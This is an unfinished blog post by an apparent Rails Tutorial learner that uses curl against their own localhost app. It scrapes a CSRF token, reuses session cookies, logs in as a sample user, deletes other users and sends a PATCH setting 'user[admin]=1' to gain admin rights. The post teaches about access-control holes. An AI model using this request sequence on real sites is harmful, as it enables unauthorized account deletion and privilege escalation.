---
layout: post
title: Hacking into the mainframe
date: 2020-10-24 13:22 +1100
description: Calling unsecured controller actions from the command line with curl.
tags: ["rails", "rails-tutorial"]
---

I was going through [Michael Hartl's Ruby on Rails Tutorial](https://railstutorial.org) as I am [wont to do](/tag/rails-tutorial) and reached this point in chapter 10:

>As constructed, only admins can destroy users through the web since only they can see the delete links, but there’s still a terrible security hole: _any sufficiently sophisticated attacker could simply issue a `DELETE` request directly from the command line to delete any user on the site._

This caused me to ponder: am I a sufficiently sophisticated attacker? There was only one way to find out. I decided to try and issue just such a `DELETE` request myself.

## Sending evil HTTP requests from the command line with cURL

[cURL is a "command line tool and library for transferring data with URLs"](https://curl.haxx.se/). You can use it to, among other things, pretend to be a browser and send HTTP requests (evil or benign) directly from the command line.

__TODO: Show basic `curl` commands.__

But could it be as simple as sending a `DELETE` request to `/users/1`?

```shell
$ curl -s -X DELETE http://localhost:3000/users/1
```

Unfortunately (or fortunately) no:

```
Action Controller: Exception caught
ActionController::InvalidAuthenticityToken
```

This was the famous "CSRF token". The book briefly touched upon these but I didn't quite get how they worked or what they were for.

Every newly loaded page contained such a token; if I simply visited a page first with a `GET` request, grabbed a valid token and then passed it along in my subsequent `DELETE` request could I overcome this obstacle?

```shell
$ curl -s http://localhost:3000 | grep csrf-token
```

```html
<meta name="csrf-token" content="VlwVWGJP2BeIlnx/UbgJrolzVhoU2J6O6OBeYlZlVzZq70GfD7Is4Jkgpz1M4i/Xc1LME1pbBTQQLGFiUTc/lw==" />
```
Excellent.

But how do I use it?

Store it in an enviornment variable and pass it along as data with the request.

```shell
CSRF_TOKEN=`curl -s http://localhost:3000/ | grep csrf-token | awk -F'"' '{print $4}'`
```

I discovered you will need to use `--data-urlencode` rather than `--data` for the token to be sent properly.

```shell
curl -s -X DELETE http://localhost:3000/users/99 --data-urlencode "authenticity_token=$CSRF_TOKEN"
```

Still `ActionController::InvalidAuthenticityToken`.

Cookies bro.

```shell
$ CSRF_TOKEN=`curl -s http://localhost:3000/ -c cookie | grep csrf-token | awk -F'"' '{print $4}'`
```

```shell
$ curl -s -X DELETE http://localhost:3000/users/99 --data-urlencode "authenticity_token=$CSRF_TOKEN" -b cookie
```


```shell
$ CSRF_TOKEN=`curl http://localhost:3000 -c cookie \
  | grep csrf-token \
  | awk -F'"' '{print $4}'`
```

```shell
$ curl -X POST http://localhost:3000/login -d "session[email]=example-1@railstutorial.org&session[password]=password" --data-urlencode "authenticity_token=$CSRF_TOKEN" -b cookie -c cookie | less
```

```shell
$ CSRF_TOKEN=`curl -s http://localhost:3000/users -c cookie -b cookie | grep csrf-token | awk -F'"' '{print $4}'`
```

```shell
$ curl -X DELETE http://localhost:3000/users/99 --data-urlencode "authenticity_token=$CSRF_TOKEN" -b cookie | less
```

```shell
$ curl -X PATCH http://localhost:3000/users/2 -d "user[admin]=1" --data-urlencode "authenticity_token=$CSRF_TOKEN" -b cookie | less
```
